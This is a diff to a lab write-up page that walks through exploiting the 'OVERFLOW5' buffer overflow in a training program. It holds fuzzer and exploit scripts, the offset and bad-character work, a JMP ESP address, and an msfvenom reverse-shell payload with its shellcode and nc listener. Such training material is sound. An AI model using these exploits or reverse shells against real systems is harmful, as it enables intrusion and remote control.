@@ -1160,7 +1160,7 @@ python fuzzer.py $VICTIM 1337
 
 Program crashed at 2100 bytes with fuzzer.py
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (4).png" alt=""><figcaption></figcaption></figure>
 
 ```
 /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2100
@@ -1216,7 +1216,7 @@ python exploit.py $VICTIM 1337
 !mona findmsp -distance 2100
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding Bad Characters
 
@@ -1306,7 +1306,7 @@ We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with t
 !mona find -s "\xff\xe4" -m essfunc.dll
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit
 
@@ -1387,7 +1387,373 @@ nc -lvnp 4444
 python exploit.py $VICTIM 1337
 ```
 
+<figure><img src="../../.gitbook/assets/image (15) (5).png" alt=""><figcaption></figcaption></figure>
+
+## oscp.exe - OVERFLOW5
+
+#### fuzzer.py
+
+Slightly modified version of the script given.
+
+```
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+	timeout = 5
+	prefix = "OVERFLOW5 "
+	string = prefix + "A" * 100
+
+	while True:
+		try:
+			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+				s.settimeout(timeout)
+				s.connect((ip, port))
+				s.recv(1024)
+				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+				s.send(bytes(string, "latin-1"))
+				s.recv(1024)
+		except:
+			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+			sys.exit(0)
+		string += 100 * "A"
+		time.sleep(1)
+
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+
+```
+
+
+
+#### exploit.py
+
+Slightly modified version of the script given.
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = "OVERFLOW5 "
+	offset = 0
+	overflow = "A" * offset
+	retn = ""
+	padding = ""
+	payload = ""
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali**
+
+Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.
+
+```
+xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
+```
+
+### **Crash Replication & Controlling EIP**
+
+```
+python fuzzer.py $VICTIM 1337
+```
+
+Program crashed at 400 bytes with fuzzer.py
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+```
+/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 400
+```
+
+#### **exploit.py - Code Changes #1**
+
+I added the pattern\_create output into the payload variable.
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = "OVERFLOW5 "
+	offset = 0
+	overflow = "A" * offset
+	retn = ""
+	padding = ""
+	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 314.
+
+**Kali**
+
+```
+python exploit.py $VICTIM 1337
+```
+
+**Immunity Debugger**
+
+```
+!mona findmsp -distance 400
+```
+
+<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+**exploit.py - Code Changes #2**
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = "OVERFLOW5 "
+	offset = 314
+	overflow = "A" * offset
+	retn = "BBBB"
+	padding = ""
+	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali**
+
+After running the program again we now can fill EIP with our Bs so we now have control of EIP.
+
+```
+python exploit.py $VICTIM 1337
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+### Finding Bad Characters
+
+**Kali**
+
+Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x16\x2f\xf4\xfd
+
+```
+python exploit.py $VICTIM 1337
+```
+
+#### **exploit.py - Code Changes #3**
+
+```
+import socket, time, sys
+
+#Bad chars found: \x00\x16\x2f\xf4\xfd
+badChars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+"\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e"
+"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
+"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
+"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
+"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
+"\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"
+)
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = "OVERFLOW5 "
+	offset = 314
+	overflow = "A" * offset
+	retn = "BBBB"
+	padding = ""
+	payload = badChars
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+### Finding a Jump Point
+
+Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;
+
+**Immunity Debugger**
+
+```
+!mona modules
+```
+
 <figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
+We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.
 
+**Immunity Debugger**
 
+```
+!mona find -s "\xff\xe4" -m essfunc.dll
+```
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+### Exploit
+
+Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to  &#x20;
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c
+```
+
+#### **exploit.py - Code Changes #3**
+
+```
+import socket, time, sys
+
+#Bad chars found: \x00\x16\x2f\xf4\xfd
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = "OVERFLOW5 "
+	offset = 314
+	overflow = "A" * offset
+	retn = "\xaf\x11\x50\x62"
+	padding = ""
+	payload = ("\xfc\xbb\x0c\x8e\xf6\x94\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf0\x66\x74\x94\x08"
+"\x77\x19\x1c\xed\x46\x19\x7a\x66\xf8\xa9\x08\x2a\xf5\x42\x5c"
+"\xde\x8e\x27\x49\xd1\x27\x8d\xaf\xdc\xb8\xbe\x8c\x7f\x3b\xbd"
+"\xc0\x5f\x02\x0e\x15\x9e\x43\x73\xd4\xf2\x1c\xff\x4b\xe2\x29"
+"\xb5\x57\x89\x62\x5b\xd0\x6e\x32\x5a\xf1\x21\x48\x05\xd1\xc0"
+"\x9d\x3d\x58\xda\xc2\x78\x12\x51\x30\xf6\xa5\xb3\x08\xf7\x0a"
+"\xfa\xa4\x0a\x52\x3b\x02\xf5\x21\x35\x70\x88\x31\x82\x0a\x56"
+"\xb7\x10\xac\x1d\x6f\xfc\x4c\xf1\xf6\x77\x42\xbe\x7d\xdf\x47"
+"\x41\x51\x54\x73\xca\x54\xba\xf5\x88\x72\x1e\x5d\x4a\x1a\x07"
+"\x3b\x3d\x23\x57\xe4\xe2\x81\x1c\x09\xf6\xbb\x7f\x46\x3b\xf6"
+"\x7f\x96\x53\x81\x0c\xa4\xfc\x39\x9a\x84\x75\xe4\x5d\xea\xaf"
+"\x50\xf1\x15\x50\xa1\xd8\xd1\x04\xf1\x72\xf3\x24\x9a\x82\xfc"
+"\xf0\x0d\xd2\x52\xab\xed\x82\x12\x1b\x86\xc8\x9c\x44\xb6\xf3"
+"\x76\xed\x5d\x0e\x11\x18\xa8\x38\x18\x74\xae\x38\xcb\xd9\x27"
+"\xde\x81\xf1\x61\x49\x3e\x6b\x28\x01\xdf\x74\xe6\x6c\xdf\xff"
+"\x05\x91\xae\xf7\x60\x81\x47\xf8\x3e\xfb\xce\x07\x95\x93\x8d"
+"\x9a\x72\x63\xdb\x86\x2c\x34\x8c\x79\x25\xd0\x20\x23\x9f\xc6"
+"\xb8\xb5\xd8\x42\x67\x06\xe6\x4b\xea\x32\xcc\x5b\x32\xba\x48"
+"\x0f\xea\xed\x06\xf9\x4c\x44\xe9\x53\x07\x3b\xa3\x33\xde\x77"
+"\x74\x45\xdf\x5d\x02\xa9\x6e\x08\x53\xd6\x5f\xdc\x53\xaf\xbd"
+"\x7c\x9b\x7a\x06\x9c\x7e\xae\x73\x35\x27\x3b\x3e\x58\xd8\x96"
+"\x7d\x65\x5b\x12\xfe\x92\x43\x57\xfb\xdf\xc3\x84\x71\x4f\xa6"
+"\xaa\x26\x70\xe3\xaa\xc8\x8e\x0c"
+		)
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali #1**
+
+```
+nc -lvnp 4444
+```
+
+**Kali #2**
+
+```
+python exploit.py $VICTIM 1337
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
